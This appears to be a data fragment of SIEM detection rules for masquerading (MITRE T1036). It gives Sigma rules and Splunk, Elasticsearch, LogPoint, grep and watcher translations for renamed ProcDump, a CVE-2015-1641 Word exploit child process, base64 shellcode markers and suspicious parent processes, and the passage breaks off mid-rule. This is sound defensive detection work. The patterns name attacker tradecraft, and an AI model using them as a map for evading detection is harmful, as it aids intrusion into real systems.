\".pdf.\"or process_path contains \".rtf.\"or process_path contains \".jpg.\"or process_path contains \".png.\"or process_path contains \".jpeg.\"or process_path contains \".zip.\"or process_path contains \".rar.\"or process_path contains \".ppt.\"or process_path contains \".pptx.\")", "product": "Azure Sentinel", "name": "Masquerading Extension"}, {"query": "Sysmon| where EventID == 11 and (process_path contains \"SysWOW64\"or process_path contains \"System32\"or process_path contains \"AppData\"or process_path contains \"Temp\")and (file_name contains \".exe\"or file_name contains \".dll\"or file_name contains \".bat\"or file_name contains \".com\"or file_name contains \".ps1\"or file_name contains \".py\"or file_name contains \".js\"or file_name contains \".vbs\"or file_name contains \".hta\")", "product": "Azure Sentinel", "name": "Masquerading Location"}, {"query": "title: Renamed ProcDump\nid: 4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67\nstatus: experimental\ndescription: Detects the execution of a renamed ProcDump executable often used by attackers or malware\nreferences:\n    - https://docs.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth\ndate: 2019/11/18\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        OriginalFileName: 'procdump'\n    filter:\n        Image: \n            - '*\\procdump.exe'\n            - '*\\procdump64.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Procdump illegaly bundled with legitimate software\n    - Weird admins who renamed binaries\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Renamed ProcDump\nid: 4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67\nstatus: experimental\ndescription: Detects the execution of a renamed ProcDump executable often used by attackers or malware\nreferences:\n    - https://docs.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth\ndate: 2019/11/18\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        OriginalFileName: 'procdump'\n    filter:\n        Image: \n            - '*\\procdump.exe'\n            - '*\\procdump64.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Procdump illegaly bundled with legitimate software\n    - Weird admins who renamed binaries\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(OriginalFileName:\"procdump\" AND (NOT (Image.keyword:(*\\\\\\\\procdump.exe OR *\\\\\\\\procdump64.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Renamed-ProcDump <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Renamed ProcDump\",\\n    \"description\": \"Detects the execution of a renamed ProcDump executable often used by attackers or malware\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": \"(OriginalFileName:\\\\\"procdump\\\\\" AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\procdump.exe OR *\\\\\\\\\\\\\\\\procdump64.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(OriginalFileName:\\\\\"procdump\\\\\" AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\procdump.exe OR *\\\\\\\\\\\\\\\\procdump64.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Renamed ProcDump\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(OriginalFileName:\"procdump\" AND (NOT (Image.keyword:(*\\\\\\\\procdump.exe *\\\\\\\\procdump64.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(OriginalFileName=\"procdump\" NOT ((Image=\"*\\\\\\\\procdump.exe\" OR Image=\"*\\\\\\\\procdump64.exe\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(OriginalFileName=\"procdump\"  -(Image IN [\"*\\\\\\\\procdump.exe\", \"*\\\\\\\\procdump64.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*procdump)(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\procdump\\\\.exe|.*.*\\\\procdump64\\\\.exe))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Exploit for CVE-2015-1641\nid: 7993792c-5ce2-4475-a3db-a3a5539827ef\nstatus: experimental\ndescription: Detects Winword starting uncommon sub process MicroScMgmt.exe as used in exploits for CVE-2015-1641\nreferences:\n    - https://www.virustotal.com/en/file/5567408950b744c4e846ba8ae726883cb15268a539f3bb21758a466e47021ae8/analysis/\n    - https://www.hybrid-analysis.com/sample/5567408950b744c4e846ba8ae726883cb15268a539f3bb21758a466e47021ae8?environmentId=100\nauthor: Florian Roth\ndate: 2018/02/22\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\WINWORD.EXE'\n        Image: '*\\MicroScMgmt.exe '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Exploit for CVE-2015-1641\nid: 7993792c-5ce2-4475-a3db-a3a5539827ef\nstatus: experimental\ndescription: Detects Winword starting uncommon sub process MicroScMgmt.exe as used in exploits for CVE-2015-1641\nreferences:\n    - https://www.virustotal.com/en/file/5567408950b744c4e846ba8ae726883cb15268a539f3bb21758a466e47021ae8/analysis/\n    - https://www.hybrid-analysis.com/sample/5567408950b744c4e846ba8ae726883cb15268a539f3bb21758a466e47021ae8?environmentId=100\nauthor: Florian Roth\ndate: 2018/02/22\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\WINWORD.EXE'\n        Image: '*\\MicroScMgmt.exe '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:*\\\\\\\\WINWORD.EXE AND Image.keyword:*\\\\\\\\MicroScMgmt.exe\\\\ )", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Exploit-for-CVE-2015-1641 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Exploit for CVE-2015-1641\",\\n    \"description\": \"Detects Winword starting uncommon sub process MicroScMgmt.exe as used in exploits for CVE-2015-1641\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\WINWORD.EXE AND Image.keyword:*\\\\\\\\\\\\\\\\MicroScMgmt.exe\\\\\\\\ )\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\WINWORD.EXE AND Image.keyword:*\\\\\\\\\\\\\\\\MicroScMgmt.exe\\\\\\\\ )\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Exploit for CVE-2015-1641\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:*\\\\\\\\WINWORD.EXE AND Image.keyword:*\\\\\\\\MicroScMgmt.exe )", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentImage=\"*\\\\\\\\WINWORD.EXE\" Image=\"*\\\\\\\\MicroScMgmt.exe \")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\WINWORD.EXE\" Image=\"*\\\\\\\\MicroScMgmt.exe \")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\WINWORD\\\\.EXE)(?=.*.*\\\\MicroScMgmt\\\\.exe ))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: New (or renamed) user account with '$' in attribute 'SamAccountName'.\nid: cfeed607-6aa4-4bbd-9627-b637deb723c8\nstatus: experimental\ndescription: Detects possible bypass EDR and SIEM via abnormal user account name.\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nauthor: Ilyas Ochkov, oscd.community\ndate: 2019/10/25\nmodified: 2019/11/13\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: \n            - 4720 # create user\n            - 4781 # rename user\n        UserName|contains: '$'    #SamAccountName\n    condition: selection\nfields:\n    - EventID\n    - UserName\n    - SubjectAccountName\nfalsepositives:\n    - Unkown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: New (or renamed) user account with '$' in attribute 'SamAccountName'.\nid: cfeed607-6aa4-4bbd-9627-b637deb723c8\nstatus: experimental\ndescription: Detects possible bypass EDR and SIEM via abnormal user account name.\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nauthor: Ilyas Ochkov, oscd.community\ndate: 2019/10/25\nmodified: 2019/11/13\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: \n            - 4720 # create user\n            - 4781 # rename user\n        UserName|contains: '$'    #SamAccountName\n    condition: selection\nfields:\n    - EventID\n    - UserName\n    - SubjectAccountName\nfalsepositives:\n    - Unkown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:(\"4720\" OR \"4781\") AND UserName.keyword:*$*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/New-or-renamed-user-account-with-\\'$\\'-in-attribute-\\'SamAccountName\\'. <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"New (or renamed) user account with \\'$\\' in attribute \\'SamAccountName\\'.\",\\n    \"description\": \"Detects possible bypass EDR and SIEM via abnormal user account name.\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"4720\\\\\" OR \\\\\"4781\\\\\") AND UserName.keyword:*$*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"4720\\\\\" OR \\\\\"4781\\\\\") AND UserName.keyword:*$*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'New (or renamed) user account with \\'$\\' in attribute \\'SamAccountName\\'.\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n           EventID = {{_source.EventID}}\\\\n          UserName = {{_source.UserName}}\\\\nSubjectAccountName = {{_source.SubjectAccountName}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"4720\" \"4781\") AND UserName.keyword:*$*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4720\" OR EventID=\"4781\") UserName=\"*$*\") | table EventID,UserName,SubjectAccountName", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id IN [\"4720\", \"4781\"] (caller_user=\"*$*\" OR target_user=\"*$*\" OR user=\"*$*\" OR member=\"*$*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*4720|.*4781))(?=.*.*\\\\$.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: PowerShell Base64 Encoded Shellcode\nid: 2d117e49-e626-4c7c-bd1f-c3c0147774c8\ndescription: Detects Base64 encoded Shellcode\nstatus: experimental\nreferences:\n    - https://twitter.com/cyb3rops/status/1063072865992523776\nauthor: Florian Roth\ndate: 2018/11/17\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine: '*AAAAYInlM*'\n    selection2:\n        CommandLine:\n            - '*OiCAAAAYInlM*'\n            - '*OiJAAAAYInlM*'\n    condition: selection1 and selection2\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: PowerShell Base64 Encoded Shellcode\nid: 2d117e49-e626-4c7c-bd1f-c3c0147774c8\ndescription: Detects Base64 encoded Shellcode\nstatus: experimental\nreferences:\n    - https://twitter.com/cyb3rops/status/1063072865992523776\nauthor: Florian Roth\ndate: 2018/11/17\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine: '*AAAAYInlM*'\n    selection2:\n        CommandLine:\n            - '*OiCAAAAYInlM*'\n            - '*OiJAAAAYInlM*'\n    condition: selection1 and selection2\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:*AAAAYInlM* AND CommandLine.keyword:(*OiCAAAAYInlM* OR *OiJAAAAYInlM*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/PowerShell-Base64-Encoded-Shellcode <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"PowerShell Base64 Encoded Shellcode\",\\n    \"description\": \"Detects Base64 encoded Shellcode\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:*AAAAYInlM* AND CommandLine.keyword:(*OiCAAAAYInlM* OR *OiJAAAAYInlM*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:*AAAAYInlM* AND CommandLine.keyword:(*OiCAAAAYInlM* OR *OiJAAAAYInlM*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'PowerShell Base64 Encoded Shellcode\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:*AAAAYInlM* AND CommandLine.keyword:(*OiCAAAAYInlM* *OiJAAAAYInlM*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*AAAAYInlM*\" (CommandLine=\"*OiCAAAAYInlM*\" OR CommandLine=\"*OiJAAAAYInlM*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine=\"*AAAAYInlM*\" CommandLine IN [\"*OiCAAAAYInlM*\", \"*OiJAAAAYInlM*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*AAAAYInlM.*)(?=.*(?:.*.*OiCAAAAYInlM.*|.*.*OiJAAAAYInlM.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Windows Processes Suspicious Parent Directory\nid: 96036718-71cc-4027-a538-d1587e0006a7\nstatus: experimental\ndescription: Detect suspicious parent processes of well-known Windows processes\nauthor: vburov\nreferences:\n    - https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2\n    - https://www.carbonblack.com/2014/06/10/screenshot-demo-hunt-evil-faster-than-ever-with-carbon-black/\n    - https://www.13cubed.com/downloads/windows_process_genealogy_v2.pdf\n    - https://attack.mitre.org/techniques/T1036/\ndate: 2019/02/23\nmodified: 2019/08/20\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\svchost.exe'\n            - '*\\taskhost.exe'\n            - '*\\lsm.exe'\n            - '*\\lsass.exe'\n            - '*\\services.exe'\n            - '*\\lsaiso.exe'\n            - '*\\csrss.exe'\n            - '*\\wininit.exe'\n            - '*\\winlogon.exe'\n    filter:\n        ParentImage:\n            - '*\\System32\\\\*'\n            - '*\\SysWOW64\\\\*'\n            - '*\\SavService.exe'\n            - '*\\Windows Defender\\\\*\\MsMpEng.exe'\n    filter_null:\n        ParentImage: null\n    condition: selection and not filter and not filter_null\nfalsepositives:\n    - Some security products seem to spawn these\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Windows Processes Suspicious Parent Directory\nid: 96036718-71cc-4027-a538-d1587e0006a7\nstatus: experimental\ndescription: Detect suspicious parent processes of well-known Windows processes\nauthor: vburov\nreferences:\n    - https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2\n    - https://www.carbonblack.com/2014/06/10/screenshot-demo-hunt-evil-faster-than-ever-with-carbon-black/\n    - https://www.13cubed.com/downloads/windows_process_genealogy_v2.pdf\n    - https://attack.mitre.org/techniques/T1036/\ndate: 2019/02/23\nmodified: 2019/08/20\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\svchost.exe'\n            - '*\\taskhost.exe'\n            - '*\\lsm.exe'\n            - '*\\lsass.exe'\n            - '*\\services.exe'\n            - '*\\lsaiso.exe'\n            - '*\\csrss.exe'\n            - '*\\wininit.exe'\n            - '*\\winlogon.exe'\n    filter:\n        ParentImage:\n            - '*\\System32\\\\*'\n            - '*\\SysWOW64\\\\*'\n            - '*\\SavService.exe'\n            - '*\\Windows Defender\\\\*\\MsMpEng.exe'\n    filter_null:\n        ParentImage: null\n    condition: selection and not filter and not filter_null\nfalsepositives:\n    - Some security products seem to spawn these\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:(*\\\\\\\\svchost.exe OR *\\\\\\\\taskhost.exe OR *\\\\\\\\lsm.exe OR *\\\\\\\\lsass.exe OR *\\\\\\\\services.exe OR *\\\\\\\\lsaiso.exe OR *\\\\\\\\csrss.exe OR *\\\\\\\\wininit.exe OR *\\\\\\\\winlogon.exe) AND (NOT (ParentImage.keyword:(*\\\\\\\\System32\\\\\\\\* OR *\\\\\\\\SysWOW64\\\\\\\\* OR *\\\\\\\\SavService.exe OR *\\\\\\\\Windows\\\\ Defender\\\\\\\\*\\\\\\\\MsMpEng.exe)))) AND (NOT (NOT _exists_:ParentImage)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Windows-Processes-Suspicious-Parent-Directory <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Windows Processes Suspicious Parent Directory\",\\n    \"description\": \"Detect suspicious parent processes of well-known Windows processes\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": \"((Image.keyword:(*\\\\\\\\\\\\\\\\svchost.exe OR *\\\\\\\\\\\\\\\\taskhost.exe OR *\\\\\\\\\\\\\\\\lsm.exe OR *\\\\\\\\\\\\\\\\lsass.exe OR *\\\\\\\\\\\\\\\\services.exe OR *\\\\\\\\\\\\\\\\lsaiso.exe OR *\\\\\\\\\\\\\\\\csrss.exe OR *\\\\\\\\\\\\\\\\wininit.exe OR *\\\\\\\\\\\\\\\\winlogon.exe) AND (NOT (ParentImage.keyword:(*\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\SysWOW64\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\SavService.exe OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\ Defender\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\MsMpEng.exe)))) AND (NOT (NOT _exists_:ParentImage)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:(*\\\\\\\\\\\\\\\\svchost.exe OR *\\\\\\\\\\\\\\\\taskhost.exe OR *\\\\\\\\\\\\\\\\lsm.exe OR *\\\\\\\\\\\\\\\\lsass.exe OR *\\\\\\\\\\\\\\\\services.exe OR *\\\\\\\\\\\\\\\\lsaiso.exe OR *\\\\\\\\\\\\\\\\csrss.exe OR *\\\\\\\\\\\\\\\\wininit.exe OR *\\\\\\\\\\\\\\\\winlogon.exe) AND (NOT (ParentImage.keyword:(*\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\SysWOW64\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\SavService.exe OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\ Defender\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\MsMpEng.exe)))) AND (NOT (NOT _exists_:ParentImage)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Windows Processes Suspicious Parent Directory\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:(*\\\\\\\\svchost.exe *\\\\\\\\taskhost.exe *\\\\\\\\lsm.exe *\\\\\\\\lsass.exe *\\\\\\\\services.exe *\\\\\\\\lsaiso.exe *\\\\\\\\csrss.exe *\\\\\\\\wininit.exe *\\\\\\\\winlogon.exe) AND (NOT (ParentImage.keyword:(*\\\\\\\\System32\\\\\\\\* *\\\\\\\\SysWOW64\\\\\\\\* *\\\\\\\\SavService.exe *\\\\\\\\Windows Defender\\\\\\\\*\\\\\\\\MsMpEng.exe)))) AND (NOT (NOT _exists_:ParentImage)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((Image=\"*\\\\\\\\svchost.exe\" OR Image=\"*\\\\\\\\taskhost.exe\" OR Image=\"*\\\\\\\\lsm.exe\" OR Image=\"*\\\\\\\\lsass.exe\" OR Image=\"*\\\\\\\\services.exe\" OR Image=\"*\\\\\\\\lsaiso.exe\" OR Image=\"*\\\\\\\\csrss.exe\" OR Image=\"*\\\\\\\\wininit.exe\" OR Image=\"*\\\\\\\\winlogon.exe\") NOT ((ParentImage=\"*\\\\\\\\System32\\\\\\\\*\" OR ParentImage=\"*\\\\\\\\SysWOW64\\\\\\\\*\" OR ParentImage=\"*\\\\\\\\SavService.exe\" OR ParentImage=\"*\\\\\\\\Windows Defender\\\\\\\\*\\\\\\\\MsMpEng.exe\"))) NOT (NOT ParentImage=\"*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image IN [\"*\\\\\\\\svchost.exe\", \"*\\\\\\\\taskhost.exe\", \"*\\\\\\\\lsm.exe\", \"*\\\\\\\\lsass.exe\", \"*\\\\\\\\services.exe\", \"*\\\\\\\\lsaiso.exe\", \"*\\\\\\\\csrss.exe\", \"*\\\\\\\\wininit.exe\", \"*\\\\\\\\winlogon.exe\"]  -(ParentImage IN [\"*\\\\\\\\System32\\\\\\\\*\", \"*\\\\\\\\SysWOW64\\\\\\\\*\", \"*\\\\\\\\SavService.exe\", \"*\\\\\\\\Windows Defender\\\\\\\\*\\\\\\\\MsMpEng.exe\"]))  -(-ParentImage=*))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*(?:.*.*\\\\svchost\\\\.exe|.*.*\\\\taskhost\\\\.exe|.*.*\\\\lsm\\\\.exe|.*.*\\\\lsass\\\\.exe|.*.*\\\\services\\\\.exe|.*.*\\\\lsaiso\\\\.exe|.*.*\\\\csrss\\\\.exe|.*.*\\\\wininit\\\\.exe|.*.*\\\\winlogon\\\\.exe))(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\System32\\\\\\\\.*|.*.*\\\\SysWOW64\\\\\\\\.*|.*.*\\\\SavService\\\\.exe|.*.*\\\\Windows Defender\\\\\\\\.*\\\\MsMpEng\\\\.exe)))))))(?=.*(?!.*(?:.*(?=.*(?!ParentImage))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Renamed Binary\nid: 36480ae1-a1cb-4eaa-a0d6-29801d7e9142\nstatus: experimental\ndescription: Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.\nauthor: Matthew Green - @mgreen27, Ecco, James Pemberton / @4A616D6573, oscd.community (improvements)\ndate: 2019/06/15\nmodified: 2019/11/11\nreferences:\n    - https://attack.mitre.org/techniques/T1036/\n    - https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html\n    - https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html\ntags:\n    - attack.t1036\n    - attack.defense_evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - 